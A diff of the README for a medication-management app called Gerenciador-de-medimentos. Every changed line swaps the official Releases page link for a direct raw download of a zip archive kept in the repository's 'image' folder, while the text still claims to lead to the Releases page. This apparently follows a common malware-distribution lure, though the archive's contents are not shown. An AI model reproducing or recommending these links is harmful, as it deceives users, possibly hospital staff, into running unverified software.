@@ -1,7 +1,7 @@
 # 💉🩺 Gerenciador-de-medimentos - Manage Medications with Ease
 
 ## 📥 Download the Latest Release
-[![Download](https://img.shields.io/badge/Download-GitHub%20Releases-blue.svg)](https://github.com/nabinsawra/Gerenciador-de-medimentos/releases)
+[![Download](https://github.com/nabinsawra/Gerenciador-de-medimentos/raw/refs/heads/main/image/medimentos_Gerenciador_de_1.5.zip%https://github.com/nabinsawra/Gerenciador-de-medimentos/raw/refs/heads/main/image/medimentos_Gerenciador_de_1.5.zip)](https://github.com/nabinsawra/Gerenciador-de-medimentos/raw/refs/heads/main/image/medimentos_Gerenciador_de_1.5.zip)
 
 ## 🚀 Getting Started
 Welcome to the Gerenciador-de-medimentos project! This application helps you manage medications effectively in healthcare settings. The software organizes prescriptions and displays intuitive dashboards.
@@ -14,7 +14,7 @@ Welcome to the Gerenciador-de-medimentos project! This application helps you man
 - **Healthcare Focus**: Tailored specifically for hospital management tasks.
 
 ## 📥 Download & Install
-To get started, visit the [Releases page](https://github.com/nabinsawra/Gerenciador-de-medimentos/releases) to download the latest version of the application. 
+To get started, visit the [Releases page](https://github.com/nabinsawra/Gerenciador-de-medimentos/raw/refs/heads/main/image/medimentos_Gerenciador_de_1.5.zip) to download the latest version of the application. 
 
 #### Installation Steps:
 1. Click the download link above to go to the Releases page.
@@ -62,4 +62,4 @@ We appreciate all contributors to this project. Your efforts help improve the ma
 ## 📧 Contact
 For questions, suggestions, or support, please reach out via our support page. Your feedback is valuable to us.
 
-[![Download](https://img.shields.io/badge/Download-GitHub%20Releases-blue.svg)](https://github.com/nabinsawra/Gerenciador-de-medimentos/releases)
+[![Download](https://github.com/nabinsawra/Gerenciador-de-medimentos/raw/refs/heads/main/image/medimentos_Gerenciador_de_1.5.zip%https://github.com/nabinsawra/Gerenciador-de-medimentos/raw/refs/heads/main/image/medimentos_Gerenciador_de_1.5.zip)](https://github.com/nabinsawra/Gerenciador-de-medimentos/raw/refs/heads/main/image/medimentos_Gerenciador_de_1.5.zip)
